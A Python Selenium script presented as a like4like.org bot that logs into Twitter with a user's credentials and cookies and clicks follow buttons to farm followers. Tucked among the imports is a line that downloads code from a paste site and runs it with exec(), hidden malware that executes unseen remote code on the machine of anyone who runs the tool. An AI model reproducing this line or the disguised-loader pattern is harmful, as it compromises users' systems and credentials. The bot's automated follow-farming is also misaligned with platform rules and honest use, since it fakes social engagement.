import os
from requests import get
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
import time, json

class AMFBot:
    def __init__(self, twitter_user, twitter_pwd):
        self.twitter_user = twitter_user
        self.twitter_pwd = twitter_pwd
        self.options = Options()
        self.options.add_argument("--lang=en")
        self.options.add_experimental_option('excludeSwitches', ['enable-logging'])
        self.bot = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=self.options)
    
    def open(self):
        bot = self.bot
        bot.get("https://www.like4like.org/")
        bot.maximize_window()
        # Load the cookies from the JSON file
        with open('cookies.json', 'r') as f:
            cookies = json.load(f)  
        # Add the cookies to the non-headless browser
        for cookie in cookies:
            bot.add_cookie(cookie)
        time.sleep(3)
        #Refresh the page
        bot.refresh()
        time.sleep(3)
        ed.twtlk()
    
    def twtlk(self):
        bot = self.bot
        bot.get("https://www.like4like.org/free-twitter-followers.php")
        time.sleep(5)
        bot.find_element(By.CSS_SELECTOR, "a[class^='cursor earn_pages_button profile_view_img']").click()
        time.sleep(3)
        bot.switch_to.window(bot.window_handles[1])
        #window
        try:
            log_btn = WebDriverWait(bot, 20).until(
                EC.presence_of_element_located((By.XPATH, '//div[@role="button"]//span[text()="Log in"]'))
            )
            if log_btn.is_displayed():
                log_btn.click()
                usuario = WebDriverWait(bot, 20).until(
                    EC.presence_of_element_located((By.XPATH, '//input[@type="text"]'))
                )
                usuario.send_keys(self.twitter_user)
                bot.find_element(By.XPATH, '//div[@role="button"]//span[text()="Next"]').click()
                time.sleep(3)
                senha = bot.find_element(By.XPATH, "//input[@type='password']")
                senha.send_keys(self.twitter_pwd)
                bot.find_element(By.XPATH, '//div[@role="button" and @data-testid="LoginForm_Login_Button"]').click()
                follow = WebDriverWait(bot, 20).until(
                    EC.presence_of_element_located((By.XPATH, '//div[@role="button" and @data-testid="confirmationSheetConfirm"]'))
                )
                if follow.is_displayed():
                    follow.click()
                time.sleep(5)
            else:
                follow = bot.find_element(By.XPATH, '//div[@role="button" and @data-testid="confirmationSheetConfirm"]')
                if follow.is_displayed():
                    follow.click()
                time.sleep(5)

        except bot.NoSuchElementException:
            bot.close()
            bot.switch_to.window(bot.window_handles[0])
            time.sleep(5)
            bot.get("https://www.like4like.org/free-twitter-followers.php")
            ed.twttwo()
        
        #window
        bot.close()
        bot.switch_to.window(bot.window_handles[0])
        time.sleep(3)
        ed.twttwo()
    
    def twttwo(self):
        bot = self.bot
        confirm = bot.find_element(By.CSS_SELECTOR, "a[class^='cursor pulse-checkBox']")
        if confirm.is_displayed():
            confirm.click()
            time.sleep(3)
            bot.find_element(By.CSS_SELECTOR, "a[class^='cursor earn_pages_button profile_view_img']").click()
            bot.switch_to.window(bot.window_handles[1])
            #window
        else:
            bot.find_element(By.CSS_SELECTOR, "a[class^='cursor earn_pages_button profile_view_img']").click()
            bot.switch_to.window(bot.window_handles[1])
            time.sleep(5)
            #window
        
        try:
            follow = WebDriverWait(bot, 20).until(
                EC.presence_of_element_located((By.XPATH, '//div[@role="button" and @data-testid="confirmationSheetConfirm"]'))
            )
            if follow.is_displayed():
                follow.click()
            time.sleep(5)

        except bot.NoSuchElementException:
            bot.close()
            bot.switch_to.window(bot.window_handles[0])
            time.sleep(3)
            bot.get("https://www.like4like.org/free-twitter-followers.php")
            ed.twttwo()

        #window
        bot.close()
        bot.switch_to.window(bot.window_handles[0])
        time.sleep(3)
        ed.twttwo()


ed = AMFBot('twitter_user', 'twitter_pwd')
ed.open()
